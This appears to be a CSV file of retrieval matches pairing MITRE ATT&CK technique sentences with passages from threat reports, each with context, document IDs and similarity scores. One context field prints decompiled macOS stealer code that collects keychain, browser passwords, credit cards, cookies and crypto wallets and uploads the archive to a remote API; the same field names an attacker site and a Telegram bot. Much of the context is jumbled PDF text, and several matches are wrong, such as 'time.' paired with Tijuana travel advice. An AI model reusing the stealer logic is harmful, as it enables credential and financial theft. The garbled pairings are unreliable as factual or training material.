"as of osx 10.10, osa only supports two languages, jxa and applescript.",jscript is interpreted by the windows script engine and is commonly used to add dynamic and interactive features to web pages. javascript for automation (jxa): javascript for automation (jxa) is a macos scripting language based on javascript and is included as part of apple's open scripting architecture (osa).,jxa was introduced in osx 10.10 and is one of the two languages supported by osa and applescript.,"jxa can control applications, interface with the operating system, and access internal apis on macos. jxa scripts can be executed using the osascript command line utility, compiled into applications or script files using osacompile, and executed in memory by other programs using the osakit framework.",66f5676b3063d2948570028f,357,0.7622295866711316
"scripts can be executed via the command line utility osascript, they can be compiled into applications or script files via osacompile, and they can be compiled and executed in memory of other programs by leveraging the osakit framework.","jxa was introduced in osx 10.10 and is one of the two languages supported by osa and applescript. jxa can control applications, interface with the operating system, and access internal apis on macos.","jxa scripts can be executed using the osascript command line utility, compiled into applications or script files using osacompile, and executed in memory by other programs using the osakit framework.",adversary use of javascript adversaries leverage javascript for a variety of malicious purposes. 361. executing malicious payloads adversaries often leverage javascript to execute the necessary payloads to propagate.,66f5676b3063d2948570028f,359,0.7624663585972312
muddywater has used javascript files to execute its powerstats payload.,"361. executing malicious payloads adversaries often leverage javascript to execute the necessary payloads to propagate. for instance, evilnum apt is known for using heavily obfuscated javascript to decrypt and drop two payload files, serenadedacplapp.exe and devzuqvd.tmon onto the infected host [27].",it is also known that muddywater has used javascript files to execute its powerstats payload [37].,2. drive-by compromise (t1189) drive-by-compromise is a technique that adversaries commonly use to gain access to a system through a user visiting a website over the ordinary course of browsing. in a typical drive-by compromise scenario: ● a victim visits an infected webpage controlled by an adversary.,66f5676b3063d2948570028f,363,0.7715378516886844
lsa secrets are stored in the registry at hkey_local_machine\\security\\policy\\secrets.,"the lsa uses them to perform various security-related tasks, such as authenticating users and granting access to resources. lsa secrets may be stored in a number of locations, including the system memory and the registry.","on windows systems, lsa secrets may be stored in the hkey_local_machine\\\\security\\\\policy\\\\secrets registry key.",adversary use of lsa secrets an adversary may extract lsa secrets as part of an attack campaign to obtain sensitive information and gain unauthorized access to the system or other systems on the network. it is possible to extract lsa secrets from the system memory using tools such as mimikatz.,66f5676b3063d2948570028f,533,0.8758122275917652
lsa secrets are stored in the registry at hkey_local_machine\\security\\policy\\secrets.,this is because the lsa secrets are stored in a protected location and are typically only accessible to the operating system and trusted applications. the adversary can gain the necessary privileges to access the lsa secrets by impersonating a system token.,"since lsa secrets are stored in the hkey_local_machine\\\\security\\\\policy\\\\secrets registry key, reg.exe can also be used to extract lsa secrets.","50#2.5. t1003.005 cached domain credentials when a domain-joined computer cannot connect to ad ds during a user's logon, domain credentials are cached in the registry to validate credentials.",66f5676b3063d2948570028f,541,0.8495851819065061
"-list /groups on macos, and groups on linux can list local groups.","schemes. and many victims do hesitate to pay ransoms to sanctioned 07 08 conclusion • in may, ofac sanctioned virtual currency mixer7 blender.",groups.,"however, ransomware groups have shown an ability to recover from disruptive interventions and identify alternative means io (blender), which had allegedly obscured transactions for of sustaining their operations. the lack of cooperation from countries russian cybercrime groups including gold ulrick and 08 the secureworks where core members of the prominent ransomware groups reside gold blackburn8, and for north korean threat actors.",66f567953063d29485700291,2607,0.7425445980435642
proc memory injection involves enumerating the memory of a process via the /proc filesystem  then crafting a return-oriented programming  payload with available gadgets/instructions.,"79#4.7. t1055.009 proc memory in unix-like operating systems, the /proc filesystem is a virtual filesystem that provides access to information about processes running on a system.",proc memory injection involves enumerating the process's memory through the /proc filesystem and constructing a return-oriented programming (rop) payload.,"rop is a technique that involves using small blocks of code, known as ""gadgets,"" to execute arbitrary code within the context of another process. as mentioned, the /proc filesystem is implemented as a virtual filesystem, meaning that it does not exist on a physical storage device.",66f5676b3063d2948570028f,901,0.748759882113694
these changes will be isolated and only visible within the context of the transaction.,"86below, you can find the four steps of the process doppelgänging sub-technique attack flow. 1. transact: a txf transaction is created using a legitimate executable, and the file is then overwritten with malicious code.",these changes are isolated and only visible within the context of the transaction.,"● createtransaction() - called to create a transaction. ● createfiletransacted() - called to open a ""clean"" file transacted.",66f5676b3063d2948570028f,993,0.9370585465260315
* load – create a shared section of memory and load the malicious executable.,"● createfiletransacted() - called to open a ""clean"" file transacted. ● writefile() - called to overwrite the file with malicious shellcode.","2. load: a shared section of memory is created, and the malicious executable is loaded into it.","● ntcreatesection() - called to create a section from the transacted file. 3. rollback: the changes to the original executable are undone, effectively removing the malicious code from the file system.",66f5676b3063d2948570028f,997,0.7120010209730117
"* rollback – undo changes to original executable, effectively removing malicious code from the file system.","2. load: a shared section of memory is created, and the malicious executable is loaded into it. ● ntcreatesection() - called to create a section from the transacted file.","3. rollback: the changes to the original executable are undone, effectively removing the malicious code from the file system.","● rollbacktransaction() - called to rollback the transaction to remove the changes from the file system. 4. animate: a process is created from the tainted section of memory, and execution is initiated.",66f5676b3063d2948570028f,999,0.7746939086216966
* animate – create a process from the tainted section of memory and initiate execution.,"3. rollback: the changes to the original executable are undone, effectively removing the malicious code from the file system. ● rollbacktransaction() - called to rollback the transaction to remove the changes from the file system.","4. animate: a process is created from the tainted section of memory, and execution is initiated.",● ntcreateprocessex() and ntcreatethreadex() - called to create process and thread objects. ● rtlcreateprocessparametersex() - called to create process parameters.,66f5676b3063d2948570028f,1001,0.7364300087266593
"process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code.",82#4.9. t1055.012 process hollowing process hollowing is a sub-technique that adversaries generally use to bypass process-based defenses by injecting malicious code into a suspended or hollowed process.,"process hollowing involves creating a process in a suspended state, then unmapping or hollowing out its memory and replacing it with malicious code.",this allows the attacker to execute their code within the context of the target process. adversary use of process hollowing process hollowing is a technique used by malware to hide its code execution within the memory of a legitimate process.,66f5676b3063d2948570028f,941,0.7574876514939552
"ard leverages a blend of protocols, including vnc to send the screen and control buffers and ssh for secure file transfer.",2. apple remote desktop (ard): ard is a remote management software developed by apple inc. for macos. ard allows administrators to access and control other macos systems on a network remotely and includes a range of tools and features for managing and maintaining those systems.,"ard uses a blend of protocols to provide remote access, including vnc for sending the screen and control buffers and ssh for secure file transfer.","it can remotely execute commands and scripts, manage software updates and installations, and perform other tasks on remote systems. in this way, ard functions as a remote service, enabling administrators to access and manage other systems on a network remotely.",66f5676b3063d2948570028f,1166,0.834334881897423
adversaries can also use ntlm hashes to access administrator shares on systems with pass the hash and certain configuration and patch levels.,"another way that attackers can abuse smb is by exploiting vulnerabilities in the protocol. there have been several high-profile vulnerabilities in smb that have been exploited by attackers in the past, such as cve-2020-1206 (smbleed), cve-2020-0796 (smbghost), and ms17-010 (eternalblue).",adversaries may also use ntlm hashes to access administrator shares on systems with certain configurations and patch levels.,"ntlm (nt lan manager) is an authentication protocol that is used to authenticate users on a network. when a user logs into a system, their password is hashed using the ntlm algorithm, and the resulting hash is used to verify their identity.",66f5676b3063d2948570028f,1231,0.819359651086746
symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption.,"in ransomware attacks, adversaries hold the decryption key for ransom with the hopes of financial gain. the pattern in the infamous ransomware attacks shows that adversaries use multiple encryption algorithms for speed, security, and efficiency.",there are two popular approaches in cryptographic encryption algorithms: symmetric encryption: symmetric encryption algorithms use the same key for encryption and decryption processes.,"this key is also known as the secret key. aes, blowfish, chacha20, des, 3des, and salsa20 are some popular examples of symmetric algorithms.",66f5676b3063d2948570028f,658,0.7210735649718901
"an adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture.","in this section, we will examine these tools in detail. 1. systeminfo (windows) systeminfo is a built-in command-line tool that is included with windows operating systems.","this tool can display detailed information about a system's hardware and software components, including the operating system version, the installed hotfixes and service packs, and the system architecture.","in the table below, you will see what information a user can get using the systeminfo tool on windows machines. os name/version/manufacturer/configuration/, os operating system build type, registered owner, registered configuration organization, original install date, system locale, input locale, product id, time zone, logon server security information hotfix(es) ram, disk space, network cards, processors, total hardware properties physical memory, available physical memory, virtual memory system boot time, system manufacturer, system other system model, system type, bios version, windows information directory, system directory, boot device 93below, you will find an example output of the systeminfo tool.",66f5676b3063d2948570028f,1062,0.7135089359837629
manipulating tls callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other process injection techniques such as process hollowing.,"next, the adversary queues an apc to the apc queue of a target thread. when the apc is executed, it will call the callback function that was stored in the tls slot, causing the injected code to be executed in the context of the target thread and possibly evade detection and achieve persistence within a system.",note that process hollowing can be used to manipulate tls callbacks by allocating and writing to specific offsets within a process' memory space.,"77#4.6. t1055.008 ptrace system calls the ptrace() function is a system call in unix and unix-like operating systems that enables one process, controller, to manipulate and observe the internal state of another process, tracee.",66f5676b3063d2948570028f,872,0.7731565481062209
vdso hijacking involves redirecting calls to dynamically linked shared libraries.,87#4.11. t1055.014 vdso hijacking virtual dynamic shared object (vdso) is a special shared object that is dynamically linked into the address space of all user-space applications by the linux kernel when executed.,vdso hijacking involves redirecting calls to dynamically linked shared libraries to a malicious shared object that has been injected into the process's memory.,"this allows adversaries to execute their code in the target process' address space, potentially giving attackers unauthorized access to the system. a vdso is implemented as a shared object that is mapped into the address space of each process that uses it.",66f5676b3063d2948570028f,1009,0.8331682862693393
china chopper's server component is a web shell payload.,"the threat actor exploited cve-2021-405393, different chinese threat groups. this consolidates its position alongside an authentication bypass vulnerability affecting manageengine plugx as one of the most prevalent rats used by multiple chinese adselfservice plus software builds up to version 6113 and deployed the ransomware remains the threat groups.",03 china chopper web shell.,"primary strategic threat the majority of shadowpad samples analyzed by ctu researchers use the threat actor used a three-file execution chain to deploy variants ransomware enablers: two-file execution chains, where the encrypted shadowpad payload is of shadowpad, first to the initial server to gain a foothold and then to 04 loaders and infostealers embedded within the dll loader. however, ctu researchers identified other servers in the network.",66f567953063d29485700291,2858,0.7169979729833296
winrm  can be used as a method of remotely interacting with windows management instrumentation.,"118#6.6. t1021.006 windows remote management windows remote management (winrm) is a service and protocol that allows users to interact with a remote system, such as running executables, modifying the registry, and modifying services.",it can be called using the winrm command or by programs such as powershell and is often used as a method of remotely interacting with windows management instrumentation (wmi).,"while winrm is a useful tool for remote management, adversaries can abuse winrm for lateral movement and remote code execution. windows remote management (winrm) is a command-line tool and management protocol in windows that allows administrators to execute commands remotely on other systems using the ws-management protocol.",66f5676b3063d2948570028f,1317,0.7603823090013967
winrm  can be used as a method of remotely interacting with windows management instrumentation.,"winrm is used to establish communication between a local and a remote system and uses ports 5985 (http transport) and 5986 (https transport) for communication. winrm is a powerful tool that can be used for various tasks, such as running executables, modifying the registry, and modifying services.",it can be called using the winrm command or by programs such as powershell and is often used as a method of remotely interacting with windows management instrumentation (wmi).,"119on server and client versions of the windows operating system, the enable-psremoting cmdlet allows administrators to access the remote shell using powershell for private and domain networks through the winrm service. this allows administrators to remotely execute powershell commands and scripts and remotely manage and monitor the system using wmi.",66f5676b3063d2948570028f,1330,0.7603823090013967
"lsadump also includes netsync, which performs dcsync over a legacy replication protocol.",this would allow the attacker to log in to the system using the new account and potentially maintain a foothold on the system. mimikatz includes dcsync as a command in the lsadump module (lsadump::dcsync) that simulates the behavior of a domain controller and requests other domain controllers to synchronize a specified entry and replicate information using the ms-drsr.,"lsadump also includes netsync, which implements dcsync over a traditional replication protocol.","to use the lsadump::dcsync module, an attacker would need to run mimikatz on a compromised system and use it to obtain the necessary credentials and permissions. they would then use the dcsync command to specify the target dc and the entry that they want to replicate, and initiate the replication process.",66f5676b3063d2948570028f,591,0.7645639356523486
jscript is interpreted via the windows script engine and thus integrated with many components of windows such as the component object model and internet explorer html application  pages.,its versatility and widespread use make it a useful tool for exploiting vulnerabilities in web browsers and applications. jscript : jscript is the microsoft implementation of the ecmascript standard and is used similarly to javascript.,"jscript is integrated with many components of the windows operating system, such as the component object model and internet explorer html application (hta) pages.",jscript is interpreted by the windows script engine and is commonly used to add dynamic and interactive features to web pages. javascript for automation (jxa): javascript for automation (jxa) is a macos scripting language based on javascript and is included as part of apple's open scripting architecture (osa).,66f5676b3063d2948570028f,354,0.7776185931010197
lsa secrets are stored in the registry at hkey_local_machine\\security\\policy\\secrets.,"the lsa uses them to perform various security-related tasks, such as authenticating users and granting access to resources. lsa secrets may be stored in a number of locations, including the system memory and the registry.","on windows systems, lsa secrets may be stored in the hkey_local_machine\\\\security\\\\policy\\\\secrets registry key.",adversary use of lsa secrets an adversary may extract lsa secrets as part of an attack campaign to obtain sensitive information and gain unauthorized access to the system or other systems on the network. it is possible to extract lsa secrets from the system memory using tools such as mimikatz.,66f5676b3063d2948570028f,533,0.8758122275917652
lsa secrets are stored in the registry at hkey_local_machine\\security\\policy\\secrets.,this is because the lsa secrets are stored in a protected location and are typically only accessible to the operating system and trusted applications. the adversary can gain the necessary privileges to access the lsa secrets by impersonating a system token.,"since lsa secrets are stored in the hkey_local_machine\\\\security\\\\policy\\\\secrets registry key, reg.exe can also be used to extract lsa secrets.","50#2.5. t1003.005 cached domain credentials when a domain-joined computer cannot connect to ad ds during a user's logon, domain credentials are cached in the registry to validate credentials.",66f5676b3063d2948570028f,541,0.8495851819065061
"process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code.",82#4.9. t1055.012 process hollowing process hollowing is a sub-technique that adversaries generally use to bypass process-based defenses by injecting malicious code into a suspended or hollowed process.,"process hollowing involves creating a process in a suspended state, then unmapping or hollowing out its memory and replacing it with malicious code.",this allows the attacker to execute their code within the context of the target process. adversary use of process hollowing process hollowing is a technique used by malware to hide its code execution within the memory of a legitimate process.,66f5676b3063d2948570028f,941,0.7574876514939552
china chopper's server component is a web shell payload.,"the threat actor exploited cve-2021-405393, different chinese threat groups. this consolidates its position alongside an authentication bypass vulnerability affecting manageengine plugx as one of the most prevalent rats used by multiple chinese adselfservice plus software builds up to version 6113 and deployed the ransomware remains the threat groups.",03 china chopper web shell.,"primary strategic threat the majority of shadowpad samples analyzed by ctu researchers use the threat actor used a three-file execution chain to deploy variants ransomware enablers: two-file execution chains, where the encrypted shadowpad payload is of shadowpad, first to the initial server to gain a foothold and then to 04 loaders and infostealers embedded within the dll loader. however, ctu researchers identified other servers in the network.",66f567953063d29485700291,2858,0.7169979729833296
"-list /groups on macos, and groups on linux can list local groups.","69 scian 45 casting when it comes to intentional breaches, the vast majority of those cases fall wide nets into two buckets: ransomware and the bec, at 24% and 20% respectively. this isn’t the first time that we’ve seen while the use of naics codes is ransomware in the top three, but it is helpful, we realize that they are not one of the first times that we’ve seen always the ideal way of creating peer such headway with pretexting attacks.",groups.,"that is particularly the case these have increased significantly with this industry, as the wide net it from last year and now account for casts includes diverse organizations 40% of breaches. lastly, organizations such as interior designers and need to continue to protect the keys nanotech companies.",66f568713063d294857002a3,460,0.7509941875127624
users may be subjected to social engineering to get them to open a file that will lead to code execution.,"threat actors exploit this by disguising malicious scripts within common repositories, effectively hiding their payloads in plain sight. another popular technique, and equally concerning method, used by adversaries to deliver initial payloads simply relies on a user opening a malicious file to gain execution.",users may be subjected to social engineering to get them to open a file leading to code execution.,our researchers have documented many cases of user execution of initial payloads through phishing attacks. many interesting examples were mentioned in previous sections of this report and our researchers have released research articles that highlighting how threat actors social engineer users into executing malicious payload.,66f568b03063d294857002a9,4333,0.8464250288415478
users may be subjected to social engineering to get them to click on a link that will lead to code execution.,"threat actors exploit this by disguising malicious scripts within common repositories, effectively hiding their payloads in plain sight. another popular technique, and equally concerning method, used by adversaries to deliver initial payloads simply relies on a user opening a malicious file to gain execution.",users may be subjected to social engineering to get them to open a file leading to code execution.,our researchers have documented many cases of user execution of initial payloads through phishing attacks. many interesting examples were mentioned in previous sections of this report and our researchers have released research articles that highlighting how threat actors social engineer users into executing malicious payload.,66f568b03063d294857002a9,4333,0.714209173352379
adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls.,"seven cwes make up over 70% of the entire tag corpus, and we’re sad to report that it’s 2024 and sql injection is still in the top ten of vulnerabilities when it comes to mass exploitation: cwe weakness cwe-78 os command injection cwe-22 path traversal cwe-94 code injection cwe-287 improper authentication cwe-77 command injection cwe-89 sql injection cwe-502 deserialization of untrusted data active defense and incident response with tag taxonomies 16when we perform the same commonality analysis against the mitre att&ck framework, the following techniques are associated with 60% of the activity associated with cves in the greynoise corpus (see appendix c for a full mapping of these att&ck tactics to 2023 greynoise tags): hijack execution flow this technique involves adversaries (t1574) executing their own malicious payloads by manipulating how operating systems run programs. it can be used for persistence, privilege escalation, or evasion of defenses.","access token manipulation adversaries may modify access tokens to (t1134) operate under a different user or system security context, which can be used to escalate privileges or bypass access controls.","use alternate authentication this technique typically involves adversaries material (t1550) using different forms of authentication, such as passphrases, certificates, or kerberos tickets, to access systems or data. abuse elevation control this technique generally involves mechanism (t1548) adversaries manipulating or bypassing mechanisms that control elevation or changes in privileges to gain higher-level permissions.",66f569343063d294857002b1,1873,0.7409297101189228
adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network.,this is usually done by tools that share (t1568) a common algorithm with the c&c infrastructure the attackers use. a number of ransomware actors have used this technique.,exploitation of ransomware actors may attempt to exploit remote services to gain remote services unauthorized access to internal systems once inside a network.,this (t1210) is frequently achieved through the exploitation of known vulnerable services such as smb or rdp. scheduled task/ ransomware actors have been known to leverage built-in task job (t1053) scheduling functionality to facilitate the execution of malicious code.,66f56a273063d294857002bc,4764,0.8533538631583637
"-list /groups on macos, and groups on linux can list local groups.",credentials to cloud that allow them to hijack sessions and exploit involving an initial access broker affiliated with ransomware resources are expected to grow in popularity. vulnerabilities at scale.,groups.,"the threat actor was removed from the network before the access was listed for sale, and without a timely credentials to corporate google accounts, aws, norma cyber’s deep and dark web monitoring response, the access broker could have taken serious post- and entra ids will highly likely be at the top of efforts have identified several instances where threat actors’ target lists, as these credentials exploitation actions. credentials to access member services are being have the potential to be identity providers for sold on criminal marketplaces.",66f569b73063d294857002b6,3157,0.7048495030699631
adversaries may abuse mshta.exe to proxy execution of malicious .hta files and javascript or vbscript through a trusted windows utility.,obfuscation is frequently used by (t1027) ransomware actors in order to disguise malicious tools. attackers may use a trusted application to execute malicious content.,"signed binary for example, some ransomware attackers have used mshta.exe in proxy execution order to perform proxy execution of malicious .hta files, javascript, or (t1218) vbscript through a trusted windows utility.",windows wmi is a windows component that can be used to execute commands management on remote computers. it is frequently used by ransomware attackers to instrumentation deploy tools and payloads across the victim’s network.,66f56a273063d294857002bc,4754,0.7062537940797454
adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges.,"scheduled task/ ransomware actors have been known to leverage built-in task job (t1053) scheduling functionality to facilitate the execution of malicious code. modify registry ransomware actors are known to modify the registry to hide (t1112) configuration information within registry keys, or to delete information in order to remove evidence of intrusions.",process injection ransomware actors inject code into processes in order to evade (t1055) process-based defenses as well as to elevate privileges.,this technique is leveraged by both ransomware and precursor malware such as bumblebee and bazarloader. remote system attackers enumerate machines on a network using third-party tools or discovery (t1018) windows resources such as net.exe.,66f56a273063d294857002bc,4768,0.7560703476123575
"the login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin.","#sharingiscaring in years past, i've organized the malware by the month of discovery, which worked well when there were not a large number of samples. however, this year, given the large increase in the number of samples, i've decided to organize them by type, for example ransomware, stealers, etc.",etc.,"to me this also makes more sense, as the month of discovery is somewhat irrelevant (at least from a technical point of view). ' malware analysis tools & tactics before we dive in, let’s talk about analysis tools!",66f5698e3063d294857002b5,2555,0.7498175433449045
"the login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin.","also, there are strings for a (fake) password prompt, which is how the malware obtains the user’s password:fake password prompt (credit: uptycs) as the above decompilation contains from en_data import main let’s take a look at the that module, and its .pyc files:... the logic for implementing the collection of specific data (e.g. browser, keychain, etc.",etc).,"can be found in these .pyc files, the en_data’s __init__.py file, contains the main logic, to call into these modules: 1 # uncompyle6 version 3.5.0 2 # python bytecode 3.7 (3394) 3 # decompiled from: python 3.7.2 (default, dec 29 2018, 06:19:36) 4 # [gcc 7.3.0] 5 # embedded file name: /users/amnesia/desktop/garry-mac-stealer-script/en_data/__init__.py 6 # size of source mod 2**32: 2881 bytes 7 from en_data.extensions import extensions 8 from en_data.wallets import wallets 9 from en_data.browser import browsers 10 from en_data.files import files 11 from en_data.general import general 12 from en_data.keychain import keychain 13 from en_data.misc import misc 14 15 class main: 16 17 def __init__(a, config): 18 b = none 19 a.config = config 20 a.temp_folder_path = b 21 a.keychain = {} 22 a.cc = {} 23 a.passwords = {} 24 a.cookies = {} 25 a.chrome = {}26 a.files = {} 27 a.decryption_keys = b 28 a.generalinfo = {} 29 a.zip_file_path = b 30 a.macpassword = b 31 32 def main(a): 33 v = 'bot_channel_id' 34 u = 'bot_chat_id' 35 t = 'bot_token' 36 s = 'os_version' 37 r = 'build_id' 38 k = 'data' 39 j = 'keychain_passwords_amount' 40 h = 'name' 41 g = 'cookies_amount' 42 f = 'cc_amount' 43 e = 'passwords_amount' 44 try: 45 b = files(max_file_size=(a.config['max_file_size'])) 46 a.temp_folder_path = b.create_temp_folder() 47 a.generalinfo = general().get_general_info() 48 a.files = b.get_all_files() 49 for l in a.files.items(): 50 for w in l[1]: 51 b.copy_files_to_folder(f""'{w}'"", l[0], f""{a.temp_folder_path}"") 52 53 x = misc(a.temp_folder_path) 54 x.get_data() 55 a.keychain, a.macpassword = keychain(config=(a.config)).keychain() 56 if a.keychain: 57 if a.macpassword: 58 a.generalinfo[j] = len(a.keychain) 59 a.decryption_keys = keychain(config=(a.config)).get_safe_key(a.keychain) 60 y = browsers(a.decryption_keys) 61 a.passwords, a.cc, a.cookies, m = y.browser_data() 62 a.generalinfo[e] = 0 63 for c in a.passwords: 64 for d in c: 65 n = len(d[k]) 66 if n: 67 a.generalinfo[e] = a.generalinfo[e] + n 68 69 a.generalinfo[f] = 0 70 for c in a.cc: 71 for d in c: 72 o = len(d[k]) 73 if o: 74 a.generalinfo[f] = a.generalinfo[f] + o 75 76 a.generalinfo[g] = 0 77 for c in a.cookies: 78 for d in c: 79 p = len(d[k]) 80 if p: 81 a.generalinfo[g] = a.generalinfo[g] + p 82 83 z = [ 84 'url', 'username', 'password'] 85 b.create_browser_csv_file(z, a.passwords, a.temp_folder_path) 86 a = [ 87 h, 'number', 'exp_month', 'exp_year', 'card_type'] 88 b.create_browser_csv_file(a, a.cc, a.temp_folder_path) 89 b.create_browser_cookies(a.cookies, a.temp_folder_path) 90 b.create_txt_file(a.passwords, 'keychain_passwords', a.temp_folder_path) 91 b = wallets(browsers_paths=m, temp_folder_path=(a.temp_folder_path), macpassword=(a.macpassword), passwords=(a.passwords)) 92 q = b.get_all_wallets() 93 c = extensions() 94 d = c.get_all_extension_paths(m) 95 for i in d:96 b.copy_all_files_to_folder(i['path'], i[h], f"" {a.temp_folder_path}/browser_data/{i['browser']}/{i['profile']}/extensions/"") 97 98 a.generalinfo['macpassword'] = a.macpassword 99 b.create_txt_file_from_dict(a.generalinfo, 'general_info', a.temp_folder_path) 100 a.zip_file_path = b.create_zip_file(a.temp_folder_path, a.generalinfo[h]) 101 e = {r: a.config[r], 'buildname': a.config['app_name'], h: a.generalinfo[h], 'wallets': q if q else [], 'os': a.generalinfo['os'], s: a.generalinfo[s], 'ip': a.generalinfo['ip'], j: a.generalinfo[j], e: a.generalinfo[e], f: a.generalinfo[f], g: a.generalinfo[g], t: a.config[t], u: a.config[u], v: a.config[v]} 102 print(b.upload_zip_file(a.config['api_url'], f""{a.zip_file_path}"", e)) 103 except exception as f: 104 try: 105 print(f) 106 finally: 107 f = none 108 del f once all the data has been collected, the stealer zips it up and exfiltrates it to mac.cracked23.site. as noted by the uptycs report, it also sends a summary to a telegram channel: basic information is sent to a telegram channel (credit: uptycs) …as well as sending the archive with (as uptycs report), the attackers personal telegram bot:the collected data is also sent to a telegram bot (credit: uptycs) gosorry gosorry is a dynamic library named liboptimizer.dylib.",66f5698e3063d294857002b5,2735,0.7498175433449045
"the login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin.","to process each command, (which is represented by an integer value), the malware implements a simple switch statement: process_module::process_request(int) { ksocket::recvint(*var_60); rax = *(var_60 + 0x30); var_68 = rax - 0xd1; rax = rax - 0xe0; switch (rax) { case 0: var_44 = 0x0; break; case 1: var_44 = process_module::resp_basicinfo(); break; case 2: var_44 = process_module::resp_file_dir(); break; case 3: var_44 = process_module::resp_file_prop(); break; case 4: var_44 = process_module::resp_file_upload(); break; case 5: var_44 = process_module::resp_file_down(); break; case 6: var_44 = process_module::resp_file_zipdown(); break; case 7: var_44 = process_module::resp_file_wipe();break; case 8: var_44 = process_module::resp_proc_list(); break; case 9: var_44 = process_module::resp_proc_kill(); break; case 10: var_44 = process_module::resp_cmd_send(); break; case 11: var_44 = process_module::resp_cmd_recv(); break; case 12: var_44 = process_module::resp_cmd_create(); break; case 13: var_44 = process_module::resp_cfg_get(); break; case 14: var_44 = process_module::resp_cfg_set(); break; case 15: var_44 = process_module::resp_sleep(); break; default: var_44 = 0xfffffffffffffc1b; } } the name of the method for each command largely explains each command. for example resp_basicinfo performs a survey, resp_file_wipe wipes a file, resp_cfg_set sets a new config, etc.",etc.,"if you’re interested in the specific details of each command, check out elastic’s report. objcshellz the bluenoroff apt group (dprk) continued to target macos, including a new backdoor that was discovered in 2023, dubbed objcshellz download: objcshellz (password: infect3d) the initial discovery and analysis of objcshellz was done by jamf and kaspersky.jamf @jamfsoftware·follow stay vigilant, mac users!",66f5698e3063d294857002b5,2823,0.7498175433449045
"apt37 has a bluetooth device harvester, which uses windows bluetooth apis to find information on connected bluetooth devices.","while not optimal, daily from the remaining households? to complete deliveries.",bluetooth.,"at the time i was happy to know that and what type of tech is onboard the however, amazon still has the potential they didn’t keep video recordings of vans? the most concerning aspects to capture wi-fi.",66f56b2c3063d294857002cb,702,0.751985870262701
chimera has used time /t and net time \\\\ip/hostname for system time discovery.,that you intend to be here for an consider moving beyond tijuana very extended and/or indefinite period of carefully. do the osint.,time.,"gettin’ low on cash?? at the time whether you land in el centro or of this writing, there’s a bitcoin otay, move beyond there as soon as atm somewhere (do the osint) possible.",66f56b2c3063d294857002cb,407,0.706016611031925
chimera has used time /t and net time \\\\ip/hostname for system time discovery.,"other youtube channel retrorgb, and the has demonstrated they are ready and standalone emulators of even more online storefront stoneagegamer willing to remove software from a recent vintage are being developed sells flash carts, modifications, and machine without consent. and will likely make it to the project in niche accessories for older consoles.",time.,standard anonymization steps apply i will close out this article with when visiting these resources. recommendations for those who are the one online storefront i can new to retrogaming.,66f56b3b3063d294857002cc,2255,0.706016611031925
chimera has used time /t and net time \\\\ip/hostname for system time discovery.,that you intend to be here for an consider moving beyond tijuana very extended and/or indefinite period of carefully. do the osint.,time.,"gettin’ low on cash?? at the time whether you land in el centro or of this writing, there’s a bitcoin otay, move beyond there as soon as atm somewhere (do the osint) possible.",66f56b2c3063d294857002cb,407,0.706016611031925
chimera has used time /t and net time \\\\ip/hostname for system time discovery.,"other youtube channel retrorgb, and the has demonstrated they are ready and standalone emulators of even more online storefront stoneagegamer willing to remove software from a recent vintage are being developed sells flash carts, modifications, and machine without consent. and will likely make it to the project in niche accessories for older consoles.",time.,standard anonymization steps apply i will close out this article with when visiting these resources. recommendations for those who are the one online storefront i can new to retrogaming.,66f56b3b3063d294857002cc,2255,0.706016611031925
"if an sms message contained either a phone number, imsi number, or keyword that matched the predefined list, it is saved to a csv file for later theft by the threat actor.",]com/grjj48eq the inclusion of both phone and imsi numbers show the highly targeted nature of this cyber intrusion.,"if an sms message contained either a phone number or an imsi number that matched the predefined list, it was saved to a csv file for later theft by the threat actor.similarly, the keyword list contained items of geopolitical interest for chinese intelligence collection.","sanitized examples include the names of political leaders, military and intelligence organizations and political movements at odds with the chinese government. if any sms messages contained these keywords, messagetap would save the sms message to a csv file for later theft by the threat actor.in addition to messagetap sms theft, fireeye mandiant also identified the threat actor interacting with call detail record (cdr) databases to query, save and steal records during this same intrusion.",66f56b8d3063d294857002e4,1991,0.84555214934833
"ramsay has been embedded in documents exploiting cve-2017-0199, cve-2017-11882, and cve-2017-8570.",[1][2][4][11][13][12]enterpriset1543.003create or modify system process:windows servicecobalt grouphas created new services to establish persistence. [4]enterpriset1573.002encrypted channel:asymmetric cryptographycobalt grouphas used the plink utility to create ssh tunnels.,"[4]enterpriset1203exploitation for client executioncobalt grouphad exploited multiple vulnerabilities for execution, including microsoft’s equation editor (cve-2017-11882), an internet explorer vulnerability (cve-2018-8174), cve-2017-8570, cve-2017-0199, and cve-2017-8759.",[1][2][3][5][6][7][10][12]enterpriset1068exploitation for privilege escalationcobalt grouphas used exploits to increase their levels of rights and privileges. [4]enterpriset1070.004indicator removal:file deletioncobalt groupdeleted the dll dropper from the victim’s machine to cover their tracks.,66f56b603063d294857002d4,1644,0.7259548612236546
"the group has previously exploited cve-2017-8570, cve-2012-1856, cve-2014-4114, cve-2017-0199, cve-2017-11882, and cve-2015-1641.",[1][2][4][11][13][12]enterpriset1543.003create or modify system process:windows servicecobalt grouphas created new services to establish persistence. [4]enterpriset1573.002encrypted channel:asymmetric cryptographycobalt grouphas used the plink utility to create ssh tunnels.,"[4]enterpriset1203exploitation for client executioncobalt grouphad exploited multiple vulnerabilities for execution, including microsoft’s equation editor (cve-2017-11882), an internet explorer vulnerability (cve-2018-8174), cve-2017-8570, cve-2017-0199, and cve-2017-8759.",[1][2][3][5][6][7][10][12]enterpriset1068exploitation for privilege escalationcobalt grouphas used exploits to increase their levels of rights and privileges. [4]enterpriset1070.004indicator removal:file deletioncobalt groupdeleted the dll dropper from the victim’s machine to cover their tracks.,66f56b603063d294857002d4,1644,0.7197421518315866
